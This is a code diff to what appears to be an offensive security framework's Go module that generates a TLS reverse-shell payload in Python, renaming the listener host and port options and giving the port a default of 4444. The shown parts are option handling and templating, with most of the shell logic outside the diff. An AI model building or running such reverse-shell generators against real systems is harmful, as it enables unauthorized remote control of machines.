@@ -37,14 +37,15 @@ func (p *RevshellTLSPayload) GetTags() []string {
 func (p *RevshellTLSPayload) GetOptions() []modules.Option {
 	return []modules.Option{
 		{
-			Name:        "LHOST",
+			Name:        "LISTENER_IP",
 			Description: "Attacker listener host (IP or hostname)",
 			Required:    true,
 		},
 		{
-			Name:        "LPORT",
-			Description: "Attacker listener port",
-			Required:    true,
+			Name:        "LISTENER_PORT",
+			Description: "Port for reverse shell connection",
+			Required:    false,
+			Default:     "4444",
 		},
 		{
 			Name:        "SHELL",
@@ -68,21 +69,21 @@ func (p *RevshellTLSPayload) GetOptions() []modules.Option {
 }
 
 func (p *RevshellTLSPayload) Validate(options map[string]string) error {
-	if options["LHOST"] == "" {
-		return fmt.Errorf("LHOST is required for revshell/tls payload")
+	if options["LISTENER_IP"] == "" {
+		return fmt.Errorf("LISTENER_IP is required for revshell/tls payload")
 	}
-	if options["LPORT"] == "" {
-		return fmt.Errorf("LPORT is required for revshell/tls payload")
-	}
-	if strings.Contains(options["LHOST"], "'") || strings.Contains(options["LPORT"], "'") {
-		return fmt.Errorf("LHOST and LPORT must not contain single quotes")
+	if strings.Contains(options["LISTENER_IP"], "'") || strings.Contains(options["LISTENER_PORT"], "'") {
+		return fmt.Errorf("LISTENER_IP and LISTENER_PORT must not contain single quotes")
 	}
 	return nil
 }
 
 func (p *RevshellTLSPayload) GenerateCode(options map[string]string) (string, error) {
-	lhost := options["LHOST"]
-	lport := options["LPORT"]
+	listenerIP := options["LISTENER_IP"]
+	listenerPort := options["LISTENER_PORT"]
+	if listenerPort == "" {
+		listenerPort = "4444"
+	}
 	shell := options["SHELL"]
 	if shell == "" {
 		shell = "/bin/sh"
@@ -111,9 +112,9 @@ retry_delay = %s
 
 # Override from job arguments if provided
 for i, arg in enumerate(sys.argv):
-    if arg == '--LHOST' and i + 1 < len(sys.argv):
+    if arg == '--LISTENER_IP' and i + 1 < len(sys.argv):
         lhost = sys.argv[i + 1]
-    if arg == '--LPORT' and i + 1 < len(sys.argv):
+    if arg == '--LISTENER_PORT' and i + 1 < len(sys.argv):
         lport = int(sys.argv[i + 1])
 
 print(f"Reverse shell target: {lhost}:{lport} (TLS)")
@@ -155,7 +156,7 @@ for attempt in range(1, retry_count + 1):
         time.sleep(retry_delay)
 
 print("Reverse shell session ended")
-`, lhost, lport, shell, retryCount, retryDelay)
+`, listenerIP, listenerPort, shell, retryCount, retryDelay)
 
 	return code, nil
 }
